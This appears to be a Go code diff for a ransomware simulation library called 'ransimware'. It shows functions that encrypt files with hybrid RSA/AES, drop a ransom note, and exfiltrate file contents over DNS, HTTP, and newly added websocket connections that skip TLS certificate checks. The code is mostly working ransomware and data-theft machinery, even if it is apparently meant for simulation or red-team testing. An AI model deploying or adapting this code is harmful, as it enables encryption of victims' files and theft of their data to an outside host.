@@ -8,6 +8,7 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
@@ -15,7 +16,10 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"sync"
 	"time"
+
+	ws "github.com/gorilla/websocket"
 )
 
 // DefaultEncrypt is the default encryption behavior.
@@ -99,7 +103,7 @@ func Base64Encode(path string, b []byte) ([]byte, error) {
 }
 
 // DNSExfil will return a function pointer to an ExfilFunc that
-// makes DNS queries to the specified domain.
+// exfils via DNS queries.
 func DNSExfil(domain string) ExfilFunc {
 	return func(path string, b []byte) error {
 		var b64 string
@@ -183,8 +187,7 @@ func DNSExfil(domain string) ExfilFunc {
 }
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
-// reaches out to the specified destination and uses the specified
-// headers.
+// exfils via HTTP POST requests with the specified headers.
 func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 	return func(path string, b []byte) error {
 		var b64 string
@@ -258,30 +261,24 @@ func RansomNote(path string, text []string) NotifyFunc {
 func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 	return func(path string, b []byte) ([]byte, error) {
 		var b64 []byte
-		var final []byte
+		var ctxt []byte
 		var e error
 		var key []byte
 		var n int
 		var otp []byte
 		var ptxt []byte
 
-		// Base64 decode contents
-		final = make([]byte, base64.StdEncoding.DecodedLen(len(b)))
-		if _, e = base64.StdEncoding.Decode(final, b); e != nil {
-			return b, e
-		}
-
 		// Ensure the file was encrypted with ransimware
-		if string(final[:10]) != "ransimware" {
+		if string(b[:10]) != "ransimware" {
 			return b, nil
 		}
-		final = final[10:]
+		ctxt = b[10:]
 
 		// Get key for AES decryption
-		for i, c := range final {
+		for i, c := range ctxt {
 			if c == '\n' {
-				b64 = final[:i]
-				final = final[i+1:]
+				b64 = ctxt[:i]
+				ctxt = ctxt[i+1:]
 				break
 			}
 		}
@@ -303,7 +300,7 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 		}
 
 		// AES decrypt remaining contents using helper function
-		if ptxt, e = AESDecrypt(string(otp))(path, final); e != nil {
+		if ptxt, e = AESDecrypt(string(otp))(path, ctxt); e != nil {
 			return b, e
 		}
 
@@ -351,14 +348,74 @@ func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
 
 		// Create hybrid structure
 		final = []byte("ransimware")   // tag
-		final = append(final, b64...)  // RSA encrypted key + base64
+		final = append(final, b64...)  // RSA encrypted key in base64
 		final = append(final, '\n')    // separator
 		final = append(final, ctxt...) // AES encrypted data
 
-		// Base64 encode final ciphertext
-		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(final)))
-		base64.StdEncoding.Encode(b64, final)
+		return final, nil
+	}
+}
 
-		return b64, nil
+// WebsocketExfil will return a function pointer to an ExfilFunc that
+// exfils via a websocket connection.
+func WebsocketExfil(dst string) ExfilFunc {
+	var c *ws.Conn
+	var dialer ws.Dialer
+	var e error
+	var m = &sync.Mutex{}
+
+	dialer = ws.Dialer{
+		// Skip verify in case user is using self-signed cert
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	if c, _, e = dialer.Dial(dst, nil); e != nil {
+		return func(path string, b []byte) error {
+			return e
+		}
+	}
+
+	return func(path string, b []byte) error {
+		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
+		var data []byte = append([]byte(path+" "), b64...)
+		var e error
+
+		m.Lock()
+		e = c.WriteMessage(ws.TextMessage, data)
+		m.Unlock()
+
+		return e
+	}
+}
+
+// WebsocketParallelExfil will return a function pointer to an
+// ExfilFunc that exfils via multiple websocket connections.
+func WebsocketParallelExfil(dst string) ExfilFunc {
+	var dialer = ws.Dialer{
+		// Skip verify in case user is using self-signed cert
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+
+	return func(path string, b []byte) error {
+		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
+		var c *ws.Conn
+		var data []byte = append([]byte(path+" "), b64...)
+		var e error
+
+		if c, _, e = dialer.Dial(dst, nil); e != nil {
+			return e
+		}
+		defer func() {
+			c.WriteMessage(
+				ws.CloseMessage,
+				ws.FormatCloseMessage(ws.CloseNormalClosure, ""),
+			)
+			c.Close()
+		}()
+
+		return c.WriteMessage(ws.TextMessage, data)
 	}
 }
